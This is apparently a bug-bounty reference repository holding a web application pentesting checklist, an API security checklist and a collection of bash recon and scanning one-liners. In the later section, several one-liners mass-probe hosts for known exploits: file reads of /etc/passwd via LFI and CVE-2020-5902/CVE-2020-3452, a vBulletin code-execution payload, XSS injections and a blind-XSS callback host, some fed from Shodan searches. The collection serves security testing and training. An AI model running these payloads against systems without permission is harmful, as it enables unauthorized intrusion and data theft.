# Web Application Penetration Testing Checklist
> This checklist may help you to have a good methodology for bug bounty hunting

## Table of Contents
* [Recon on wildcard domain](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#recon-on-wildcard-domain)
* [Single domain](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#single-domain)
* [Information Gathering](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#information-gathering)
* [Configuration Management](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#configuration-management)
* [Secure Transmission](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#secure-transmission)
* [Authentication](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#authentication)
* [Session Management](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#session-management)
* [Authorization](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#authorization)
* [Data Validation](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#data-validation)
* [Denial of Service](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#denial-of-service)
* [Business Logic](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#business-logic)
* [Cryptography](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#cryptography)
* [Risky Functionality - File Uploads](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#risky-functionality---file-uploads)
* [Risky Functionality - Card Payment](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#risky-functionality---card-payment)
* [HTML 5](https://github.com/Esther7171/Portswigger-labs/edit/main/Check-List/Web-App-Pentesting.md#html-5)
  
## Recon on wildcard domain
* [ ] Run amass
* [ ] Run subfinder
* [ ] Run assetfinder
* [ ] Run dnsgen
* [ ] Run massdns
* [ ] Use httprobe
* [ ] Run aquatone (screenshot for alive host)
## Single Domain
### Scanning
* [ ] Nmap scan
* [ ] Burp crawler
* [ ] ffuf (directory and file fuzzing)
* [ ] hakrawler/gau/paramspider
* [ ] Linkfinder
* [ ] Url with Android application
### Manual checking
* [ ] Shodan
* [ ] Censys
* [ ] Google [dorks](https://dorks.faisalahmed.me)
* [ ] Pastebin
* [ ] Github
* [ ] OSINT
## Information Gathering
* [ ] Test for running services, web technologies, total subdomains, and directory contents.
* [ ] Check for AI integration or chatbot functionality for data extraction testing.
* [ ] Manually explore the site
* [ ] Spider/crawl for missed or hidden content
* [ ] Check for files that expose content, such as `robots.txt`, `sitemap.xml`, `.DS_Store`
* [ ] Check the caches of major search engines for publicly accessible sites
* [ ] Check for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)
* [ ] Perform Web Application Fingerprinting
* [ ] Identify technologies used
* [ ] Identify user roles
* [ ] Identify application entry points
* [ ] Identify client-side code
* [ ] Identify multiple versions/channels (e.g. web, mobile web, mobile app, web services)
* [ ] Identify co-hosted and related applications
* [ ] Identify all hostnames and ports
* [ ] Identify third-party hosted content
* [ ] Identify Debug parameters
* [ ] Test Banner grabbing
* [ ] Identify cookie type
* [ ] By refreshing page check for network tab and config
## Configuration Management
* [ ] Check for commonly used application and administrative URLs
* [ ] Check for old, backup and unreferenced files
* [ ] Check HTTP methods supported and Cross Site Tracing (XST)
* [ ] Test file extensions handling
* [ ] Test for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)
* [ ] Test for policies (e.g. Flash, Silverlight, robots)
* [ ] Test for non-production data in live environment, and vice-versa
* [ ] Check for sensitive data in client-side code (e.g. API keys, credentials)
* [ ] Check [WaF]((https://github.com/EnableSecurity/wafw00f) on website 
* [ ] Check parameters in [JavaScript files](https://github.com/GerbenJavado/LinkFinder)
* [ ] Test for [subdomain takeover](https://github.com/PentestPad/subzy) and NS record
* [ ] Check for Mail spoof, CNMAE, A and DNS record and check for zone transfer attack
## Secure Transmission
* [ ] Check SSL Version, Algorithms, Key length
* [ ] Check for Digital Certificate Validity (Duration, Signature and CN)
* [ ] Check credentials only delivered over HTTPS
* [ ] Check that the login form is delivered over HTTPS
* [ ] Check session tokens only delivered over HTTPS
* [ ] Check if HTTP Strict Transport Security (HSTS) in use
## Authentication
* [ ] Test for user enumeration
* [ ] Test for authentication bypass
* [ ] Test for bruteforce protection
* [ ] Test password quality rules
* [ ] Test remember me functionality
* [ ] Test for autocomplete on password forms/input
* [ ] Test password reset and/or recovery
* [ ] Test password change process
* [ ] Manipulating OTP
* [ ] Test CAPTCHA
* [ ] Test multi factor authentication
* [ ] Test for logout functionality presence
* [ ] Test for cache management on HTTP (eg Pragma, Expires, Max-age)
* [ ] Test for default logins
* [ ] Test for user-accessible authentication history
* [ ] Test for out-of channel notification of account lockouts and successful password changes
* [ ] Test for consistent authentication across applications with shared authentication schema / SSO
* [ ] Test credential entry with correct and incorrect username/password combinations, and verify the responses and response codes
* [ ] Verify that after changing a username or password, the old username or password cannot be used to log in
* [ ] Ensure that when a user changes their username or password, all existing sessions are invalidated (logged out), forcing re-authentication with the new credentials
* [ ] Ensure account‑centric brute‑force protections and session handling across devices: implement rate‑limiting/account lockout and MFA, and invalidate all existing sessions when credentials change so old usernames/passwords or tokens cannot be reused
## Session Management
* [ ] Establish how session management is handled in the application (eg, tokens in cookies, token in URL)
* [ ] Check session tokens for cookie flags (httpOnly and secure)
* [ ] Check session cookie scope (path and domain)
* [ ] Check session cookie duration (expires and max-age)
* [ ] Check session termination after a maximum lifetime
* [ ] Check session termination after relative timeout
* [ ] Check session termination after logout
* [ ] Test to see if users can have multiple simultaneous sessions
* [ ] Test session cookies for randomness
* [ ] Confirm that new session tokens are issued on login, role change and logout
* [ ] Test for consistent session management across applications with shared session management
* [ ] Test for session puzzling
* [ ] Test for CSRF and clickjacking
## Authorization
* [ ] Test for path traversal
* [ ] Test for bypassing authorization schema
* [ ] Test for bypassing OTP
* [ ] Test for vertical Access control problems (a.k.a. Privilege Escalation)
* [ ] Test for horizontal Access control problems (between two users at the same privilege level)
* [ ] Test for missing authorization
* [ ] Test that the same name or email cannot be registered
* [ ] Ensure temporary emails are rejected.
* [ ] Test for double‑encoding, malformed/false encodings, special‑character encodings (e.g., null‑byte `%00`, Unicode homoglyphs/overlong sequences), and weak/insecure hashes (e.g., unsalted MD5/SHA1 or predictable hashes in URLs/responses) to ensure the server canonicalizes inputs, blocks traversal or unauthorized access, and does not expose reversible or predictable hashed secrets
## Data Validation
* [ ] Test for Reflected Cross Site Scripting
* [ ] Test for Stored Cross Site Scripting
* [ ] Test for DOM based Cross Site Scripting
* [ ] Test for Cross Site Flashing
* [ ] Test for HTML Injection
* [ ] Test for SQL Injection
* [ ] Test for LDAP Injection
* [ ] Test for ORM Injection
* [ ] Test for XML Injection
* [ ] Test for XXE Injection
* [ ] Test for SSI Injection
* [ ] Test for XPath Injection
* [ ] Test for XQuery Injection
* [ ] Test for IMAP/SMTP Injection
* [ ] Test for Code Injection
* [ ] Test for Expression Language Injection
* [ ] Test for Command Injection
* [ ] Test for Overflow (Stack, Heap and Integer)
* [ ] Test for Format String
* [ ] Test for incubated vulnerabilities
* [ ] Test for HTTP files
* [ ] Test for HTTP Splitting/Smuggling
* [ ] Test for HTTP Verb Tampering
* [ ] Test for Open Redirection
* [ ] Test for Local File Inclusion
* [ ] Test for Remote File Inclusion
* [ ] Compare client-side and server-side validation rules
* [ ] Test for NoSQL injection
* [ ] Test for HTTP,Json parameter pollution
* [ ] Test for auto-binding
* [ ] Test for Mass Assignment
* [ ] Test for NULL/Invalid Session Cookie
* [ ] Test response manipulation and check if changing the allowed request type is possible
* [ ] Check for api respose api type and api version and api data leak
* [ ] Test input-field validation, URL/filter bypasses, WAF/regex evasion, and recursive/double encodings (e.g., double‑encoding, null‑byte, Unicode variants) to ensure the server canonicalizes inputs, enforces whitelist validation, and blocks decoding‑based bypasses
* [ ] Test for clickjacking by attempting to embed the application pages in an `<iframe>` (different origins and same origin) and verify framing protections: ensure `X-Frame-Options: DENY` or `SAMEORIGIN` (as appropriate) or a CSP `frame-ancestors` directive is present, sensitive pages (login/payment/settings) cannot be framed, and sandboxing or frame‑busting is applied where needed
## Denial of Service
* [ ] Test for anti-automation
* [ ] Test for account lockout
* [ ] Test for HTTP protocol DoS
* [ ] Test for SQL wildcard DoS
* [ ] Test upload lottapixel image
## Business Logic
* [ ] Test for feature misuse
* [ ] Test for lack of non-repudiation
* [ ] Test for trust relationships
* [ ] Test for integrity of data
* [ ] Test for Parameter Tampering
* [ ] Test segregation of dutiess
## Cryptography
* [ ] Check if data which should be encrypted is not
* [ ] Check for wrong algorithms usage depending on context
* [ ] Check for weak algorithms usage
* [ ] Check for proper use of salting
* [ ] Check for randomness functions
* [ ] Test for improper decoding of cookies, path segments, and request parameters (e.g., URL/base64/double‑encoding, null‑byte, Unicode variants). Ensure the server canonicalizes inputs before authorization/lookup, rejects decoding‑based bypasses, and does not expose sensitive data when decoded. Also verify cookie handling remains secure (HttpOnly, Secure, SameSite) and decoded values cannot be abused to access other users’ data
## Risky Functionality - File Uploads
* [ ] Test that acceptable file types are whitelisted
* [ ] Test that file size limits, upload frequency and total file counts are defined and are enforced
* [ ] Test that file contents match the defined file type
* [ ] Test that all file uploads have Anti-Virus scanning in-place.
* [ ] Test that unsafe filenames are sanitised
* [ ] Test that uploaded files are not directly accessible within the web root
* [ ] Test that uploaded files are not served on the same hostname/port
* [ ] Test that files and other media are integrated with the authentication and authorisation schemas
## Risky Functionality - Card Payment
* [ ] Test for known vulnerabilities and configuration issues on Web Server and Web Application
* [ ] Test for default or guessable password
* [ ] Test for non-production data in live environment, and vice-versa
* [ ] Test for Injection vulnerabilities
* [ ] Test for Buffer Overflows
* [ ] Test for Insecure Cryptographic Storage
* [ ] Test for Insufficient Transport Layer Protection
* [ ] Test for Improper Error Handling
* [ ] Test for all vulnerabilities with a CVSS v2 score > 4.0
* [ ] Test for Authentication and Authorization issues
* [ ] Test for CSRF
* [ ] Test for Cloud Location attached to web app
## HTML 5
* [ ] Test Web Messaging
* [ ] Test for Web Storage SQL injection
* [ ] Check CORS implementation
* [ ] Check Offline Web Application

# API Security Checklist

Checklist of the most important security countermeasures when designing, testing, and releasing your API.

---

## Enumeration
- [ ] Use a fuzzer for discover new APIs. For several levels.
- [ ] Enumerate restricted endpoints. For trying to bypass. Add to the final endpoint(..;/, etc).
- [ ] Modifying the request for additional parameters. For example: &admin=true.


## Authentication

- [ ] Don't use `Basic Auth`. Use standard authentication instead (e.g., [JWT](https://jwt.io/)).
- [ ] Don't reinvent the wheel in `Authentication`, `token generation`, `password storage`. Use the standards.
- [ ] Use `Max Retry` and jail features in Login.
- [ ] Use encryption on all sensitive data.
- [ ] Reusing old session tokens

### JWT (JSON Web Token)

- [ ] Use a random complicated key (`JWT Secret`) to make brute forcing the token very hard.
- [ ] Don't extract the algorithm from the header. Force the algorithm in the backend (`HS256` or `RS256`).
- [ ] Make token expiration (`TTL`, `RTTL`) as short as possible.
- [ ] Don't store sensitive data in the JWT payload, it can be decoded [easily](https://jwt.io/#debugger-io).
- [ ] Avoid storing too much data. JWT is usually shared in headers and they have a size limit.
- [ ] More attacks about JWT:
      https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/

## Access

- [ ] Limit requests (Throttling) to avoid DDoS / brute-force attacks.
- [ ] Use HTTPS on server side with TLS 1.2+ and secure ciphers to avoid MITM (Man in the Middle Attack).
- [ ] Use `HSTS` header with SSL to avoid SSL Strip attacks.
- [ ] Turn off directory listings.
- [ ] For private APIs, allow access only from safelisted IPs/hosts.

## Authorization

### OAuth

- [ ] Always validate `redirect_uri` server-side to allow only safelisted URLs.
- [ ] Always try to exchange for code and not tokens (don't allow `response_type=token`).
- [ ] Use `state` parameter with a random hash to prevent CSRF on the OAuth authorization process.
- [ ] Define the default scope, and validate scope parameters for each application.

## Input

- [ ] Lack of input sanitization / Escaping unsafe characters.
- [ ] Use the proper HTTP method according to the operation: `GET (read)`, `POST (create)`, `PUT/PATCH (replace/update)`, and `DELETE (to delete a record)`, and respond with `405 Method Not Allowed` if the requested method isn't appropriate for the requested resource.
- [ ] Validate `content-type` on request Accept header (Content Negotiation) to allow only your supported format (e.g., `application/xml`, `application/json`, etc.) and respond with `406 Not Acceptable` response if not matched.
- [ ] Validate `content-type` of posted data as you accept (e.g., `application/x-www-form-urlencoded`, `multipart/form-data`, `application/json`, etc.).
- [ ] Validate user input to avoid common vulnerabilities (e.g., `XSS`, `SQL-Injection`, `Remote Code Execution`, etc.).
- [ ] Don't use any sensitive data (`credentials`, `Passwords`, `security tokens`, or `API keys`) in the URL, but use standard Authorization header.
- [ ] Modifying referrer headers that the API may expect.
- [ ] Use only server-side encryption.
- [ ] Use an API Gateway service to enable caching, Rate Limit policies (e.g., `Quota`, `Spike Arrest`, or `Concurrent Rate Limit`) and deploy APIs resources dynamically.
- [ ] Test file uploads request.
- [ ]  Cross-site Request Forgery (CSRF) — If your API accepts the same authentication configuration that your interactive users use, then you might be vulnerable to a CSRF attack. For example, if your interactive users login and get a “SESSIONID” cookie, and that cookie can also be used to invoke API requests, then a carefully composed HTML form could make unexpected API requests on behalf of your users.
- [ ]  IDOR in body/header is more vulnerable than ID in URL. For example: {“id”:{“id”:111}}
- [ ] Test for IDOR by manipulating resource identifiers in URLs, JSON bodies, arrays, headers, cookies, API versions, and case/encoding variants, as well as attempting access with guessable or other users’ IDs, ensuring server-side authorization consistently enforces ownership and prevents unauthorized access 


## Processing

- [ ] Check if all the endpoints are protected behind authentication to avoid broken authentication process.
- [ ] User own resource ID should be avoided. Use `/me/orders` instead of `/user/654321/orders`.
- [ ] Don't auto-increment IDs. Use `UUID` instead.
- [ ] If you are parsing XML data, make sure entity parsing is not enabled to avoid `XXE` (XML external entity attack).
- [ ] If you are parsing XML, YAML or any other language with anchors and refs, make sure entity expansion is not enabled to avoid `Billion Laughs/XML bomb` via exponential entity expansion attack.
- [ ] Use a CDN for file uploads.
- [ ] If you are dealing with huge amount of data, use Workers and Queues to process as much as possible in background and return response fast to avoid HTTP Blocking.
- [ ] Do not forget to turn the DEBUG mode OFF.
- [ ] Use non-executable stacks when available.
- [ ] If found GET /api/v1/users/<id> try DELETE / POST to create/delete users

## Output

- [ ] Send `X-Content-Type-Options: nosniff` header.
- [ ] Send `X-Frame-Options: deny` header.
- [ ] Send `Content-Security-Policy: default-src 'none'` header.
- [ ] Remove fingerprinting headers - `X-Powered-By`, `Server`, `X-AspNet-Version`, etc.
- [ ] Force `content-type` for your response. If you return `application/json`, then your `content-type` response is `application/json`.
- [ ] Don't return sensitive data like `credentials`, `passwords`, or `security tokens`.
- [ ] Return the proper status code according to the operation completed. (e.g., `200 OK`, `400 Bad Request`, `401 Unauthorized`, `405 Method Not Allowed`, etc.).
- [ ] DoS Limit: /api/news?limit=100 -> /api/news?limit=9999999999

## Monitoring

- [ ] Use centralized logins for all services and components.
- [ ] Use agents to monitor all traffic, errors, requests, and responses.
- [ ] Use alerts for SMS, Slack, Email, Telegram, Kibana, Cloudwatch, etc.
- [ ] Ensure that you aren't logging any sensitive data like credit cards, passwords, PINs, etc.
- [ ] Use an IDS and/or IPS system to monitor your API requests and instances.

---

### Local File Inclusion
> @dwisiswant0

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open-redirect
> @dwisiswant0

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

> @N3T_hunt3r
```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

### XSS
> @cihanmehmet

```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
```

> @fanimalikhack

```bash
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
```

> @oliverrickfors

```bash
cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```

### Prototype Pollution
> @R0X4R

```bash
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

### CVE-2020-5902
> @Madrobot_

```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```

### CVE-2020-3452
> @vict0ni

```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
```

### CVE-2022-0378
> @7h3h4ckv157

```bash
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```

### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
> @Madrobot_

```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```

### Find JavaScript Files
> @D0cK3rG33k

```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```

### Extract Endpoints from JavaScript
> @renniepak

```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

### Get CIDR & Org Information from Target Lists
> @steve_mcilwain

```bash
for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```

### Get Subdomains from RapidDNS.io
> @andirrahmani1

```bash
export host="HOST" ; curl -s "https://rapiddns.io/subdomain/$host?full=1#result" | grep -e "<td>.*$host</td>" | grep -oP '(?<=<td>)[^<]+' | sort -u
```

### Get Subdomains from BufferOver.run
> @\_ayoubfathi\_

```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```

> @AnubhavSingh_
```bash
export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"
```

### Get Subdomains from Riddler.io
> @pikpikcu

```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### Get Subdomains from VirusTotal
> @pikpikcu

```bash
curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomain with cyberxplore
> @pikpikcu

```
curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" 
```

### Get Subdomains from CertSpotter
> @caryhooper

```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### Get Subdomains from Archive
> @pikpikcu

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

### Get Subdomains from JLDC
> @pikpikcu

```bash
curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomains from securitytrails
> @pikpikcu

```bash
curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u
```

### Bruteforcing Subdomain using DNS Over 
> @pikpikcu

```
while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt
```

### Get Subdomains With sonar.omnisint.io
> @pikpikcu

```
curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

### Get Subdomains With synapsint.com
> @pikpikcu

```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

### Get Subdomains from crt.sh
> @vict0ni

```bash
curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

### Sort & Tested Domains from Recon.dev
> @stokfedrik

```bash
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent
```

### Subdomain Bruteforcer with FFUF
> @GochaOqradze

```bash
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
```

### Find Allocated IP Ranges for ASN from IP Address
> wains.be

```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```

### Extract IPs from a File
> @emenalf

```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

### Ports Scan without CloudFlare
> @dwisiswant0

```bash
subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```

### Create Custom Wordlists
> @tomnomnom

```bash
gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt
```

```bash
cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  
```

### Extracts Juicy Informations
> @Prial Islam Khan

```bash
for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done
```

### Find Subdomains TakeOver
> @hahwul

```bash
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

### Dump Custom URLs from ParamSpider
> @hahwul

```bash
cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
```

### URLs Probing with cURL + Parallel
> @akita_zen

```bash
cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

### Dump In-scope Assets from `chaos-bugbounty-list`
> @dwisiswant0

```bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
```

### Dump In-scope Assets from `bounty-targets-data`
> @dwisiswant0

#### HackerOne Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

#### BugCrowd Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### Intigriti Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```

#### YesWeHack Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### HackenProof Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```

#### Federacy Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

### Dump URLs from sitemap.xml
> @healthyoutlet

```bash
curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
```

### Pure Bash Linkfinder
> @ntrzz

```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt
```

### Extract Endpoints from swagger.json
> @zer0pwn

```bash
curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
```

### CORS Misconfiguration
> @manas_hunter

```bash
site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
```

### Find Hidden Servers and/or Admin Panels
> @rez0__

```bash
ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
```

### Recon Using api.recon.dev
> @z0idsec

```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain
```

### Find Live Host/Domain/Assets
> @_YashGoti_

```bash
subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

### XSS without gf
> @HacktifyS

```bash
waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
```

### Get Subdomains from IPs
> @laughface809

```bash
python3 hosthunter.py HOSTS.txt > OUT.txt
```

### Gather Domains from Content-Security-Policy
> @geeknik

```bash
curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```

### Nmap IP:PORT Parser Piped to HTTPX
> @dwisiswant0

```bash
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
```
## Juicy Subdomains
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'

## from BufferOver.run
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u 

## from Riddler.io

curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 

## from RedHunt Labs Recon API
curl --request GET --url 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=<target.com>&page_size=1000' --header 'X-BLOBR-KEY: API_KEY' | jq '.subdomains[]' -r

## from nmap
nmap --script hostmap-crtsh.nse target.com

## from CertSpotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

